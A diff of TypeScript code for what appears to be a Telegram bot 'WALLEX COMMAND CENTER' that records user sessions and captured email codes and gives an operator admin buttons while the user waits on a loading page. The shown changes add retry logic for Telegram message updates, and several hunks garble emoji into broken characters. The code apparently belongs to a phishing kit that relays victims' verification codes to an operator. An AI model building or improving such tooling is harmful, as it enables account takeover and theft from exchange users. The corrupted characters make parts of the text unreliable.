@@ -213,7 +213,7 @@ export const updateSessionWithEmailCode = async (
       );
     }
 
-    console.log("✅ Session updated with email code:", {
+    console.log("�� Session updated with email code:", {
       sessionId,
       emailCode,
     });
@@ -738,7 +738,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     return { inline_keyboard: [] };
   }
 
-  console.log("✅ Admin buttons ALLOWED - user is on loading page");
+  console.log("�� Admin buttons ALLOWED - user is on loading page");
 
   const buttons = [];
 
@@ -997,17 +997,59 @@ const updateTelegramMessage = async (
       retryCount,
     });
 
-    const response = await fetch(
-      `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
-      {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
+    // Enhanced error handling for network issues
+    let response;
+    try {
+      console.log(
+        "📡 Making request to:",
+        `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
+      );
+
+      response = await fetch(
+        `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(payload),
+          signal: AbortSignal.timeout(10000), // Increased timeout to 10 seconds
         },
-        body: JSON.stringify(payload),
-        signal: AbortSignal.timeout(8000), // 8 second timeout (optimized)
-      },
-    );
+      );
+    } catch (fetchError) {
+      console.error("❌ Network/Fetch error:", {
+        error: fetchError.message,
+        name: fetchError.name,
+        stack: fetchError.stack,
+        messageId,
+        retryCount,
+        workerUrl: TELEGRAM_API_BASE,
+      });
+
+      // Handle different types of fetch errors
+      if (fetchError.name === "AbortError") {
+        console.warn("⏰ Request timeout - Worker might be slow");
+      } else if (fetchError.message.includes("Failed to fetch")) {
+        console.warn("🌐 Network connectivity issue or CORS problem");
+      }
+
+      // Implement exponential backoff for network errors
+      if (retryCount < 3) {
+        const backoffDelay = Math.pow(2, retryCount) * 1000; // 1s, 2s, 4s
+        console.log(
+          `🔄 Retrying in ${backoffDelay}ms... (attempt ${retryCount + 1}/3)`,
+        );
+
+        setTimeout(() => {
+          updateTelegramMessage(messageId, text, replyMarkup, retryCount + 1);
+        }, backoffDelay);
+
+        return;
+      } else {
+        console.error("❌ Max retries reached, giving up on message update");
+        return;
+      }
+    }
 
     if (!response.ok) {
       const errorText = await response.text();
@@ -1318,7 +1360,7 @@ const formatSessionMessage = (session: UserSession): string => {
   // Simple footer with session info
   message += `\n\n🆔 Session: <code>${session.sessionId.substring(0, 10)}</code>
 
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬��▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 <i>🔐 WALLEX COMMAND CENTER</i>`;
 
   return message;
